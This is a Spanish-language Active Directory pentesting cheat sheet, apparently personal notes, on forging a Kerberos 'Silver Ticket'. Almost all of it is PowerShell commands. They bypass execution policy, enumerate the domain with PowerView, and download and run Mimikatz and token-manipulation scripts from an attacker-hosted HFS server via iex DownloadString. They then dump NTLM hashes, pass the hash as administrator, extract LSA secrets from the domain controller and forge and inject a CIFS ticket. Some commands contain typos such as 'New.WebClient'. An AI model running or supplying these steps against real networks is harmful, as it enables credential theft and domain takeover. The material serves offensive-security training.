# Silver Ticket 

Tags: #AD #Windows #Powershell 

Envuelve la creación de un TGS valido para un servicio especifico donde el hash de la contraseña es obtenido. Esto permite un acceso no autorizado al servicio forjando por TGS modificado. Los 'Silver Tickets' tienen un alcance mas pequeño comparado a los 'Golden Tickets', como solo proveer acceso a un recurso especifico en el sistema host y recurso. Los atacantes pueden forjar un 'Silver Ticket' para crear y usar TGS sin interactuar con los KDC.

```powershell 
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 
 	
❯ . .\PowerView.ps1                          # Importamos el modulo
❯ Get-Domain                                 # Verificamos el dominio 
❯ Get-DomainSID                              
❯ Find-LocalAdminAccess                      # Descubrir maquinas en el AD donde el user tiene acceso local de Admin
❯ Enter-PSSession <seclogs.domian.local>     # Nos autenticamos a la sesion local via remota en el 'DOMINIO' 
	❯ whoami /priv                          # Miramos si tenemos los priv para elevar los privilegios 

# En la maquina del DC abrimos un 'HFS' para transferir el archivo 'Invoke-TokenMalipulation.ps1' a la sesion remota 
	❯ cd /                                  # Nos dirigimos a la carpeta 'root' de la sesion remota 
	❯ iex (New-Object New.WebClient).DownloadString('http://IP-HFS/Invoke-TokenMalipulation.ps1')  # Descargamos en la sesion remota el modulo que se encuentra en el DC de la maquina no remota llamado 'Invoke-TokenMalipulation.ps1' por medio del 'HFS' para despues utilizarlo dentro de la misma sesion remota 
	❯ Invoke-TokenManipulation -Enumerate # Enumerara todos los token disponibles, si el 'LogonType = 2' quiere decir que el usuario admin esta loggeado

	❯ iex (New-Object New.WebClient).DownloadString('http://IP-HFS/Invoke-Mimikatz.ps1')
		❯ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM de todos los usuarios asi como el del 'Admin'
```

```powershell
# Abrimos una nueva consola de Poweshell como 'Admin'
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 
 	
❯ . .\Invoke-Mimikatz.ps1                    # Importamos el modulo 
❯ Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:<Domain> /ntlm:<hash NTLM> /run:powershell.exe"' 
# Hacemos el 'Pass-The-Hash' e ingresamos como el usuario 'Administrator'
```

```powershell 
# El comando anteriro despliega una nueva venta en Powershell como 'Admin'
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 

❯ . .\Invoke-Mimikatz.ps1                    # Importamos el modulo 
❯ Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName <DomainController> # Muestra info para el 'Silver Ticket'
```

```powershell
# En una nueva Powershell 
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas

❯ . .\PowerView.ps1                          # Importamos el modulo
❯ Get-DomainSID                              # Obtenemos el SID

❯ . .\Invoke-Mimikatz.ps1                    # Importamos el modulo 
❯ Invoke-Mimikatz -Command '"kerberos::golden /domain:<Domain> /sid:12345 /target:<DomainController> /service:CIFS /rc4:<NTLM_Hash> /user:administrator /ptt"'       # Generamos e inyectamos nuestro 'Silver Ticket' 

❯ ls \\DomainController\C$                   # Verificar si ingresamos al 'Domain Controller'
```